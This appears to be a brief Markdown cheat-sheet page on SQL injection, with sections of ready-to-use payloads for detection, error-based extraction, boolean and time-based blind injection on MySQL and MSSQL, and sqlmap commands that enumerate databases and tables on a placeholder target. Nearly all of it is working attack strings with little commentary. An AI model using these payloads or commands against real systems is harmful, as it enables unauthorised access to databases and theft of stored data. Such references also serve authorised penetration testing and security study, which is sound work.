---
title: "SQL Injection"
description: "Detection, exploitation, and bypass techniques for SQLi."
date: 2026-04-10
tags: [web, sqli, injection]
order: 1
---

## Detection

```
' -- single quote to break syntax
' OR '1'='1
1; SELECT SLEEP(5)-- -
```

## Error-based

```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))-- -
```

## Blind — Boolean

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -
```

## Blind — Time

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -   -- MSSQL
' AND SLEEP(5)-- -                        -- MySQL
```

## sqlmap

```bash
sqlmap -u "https://target.com/page?id=1" --dbs --batch
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
```
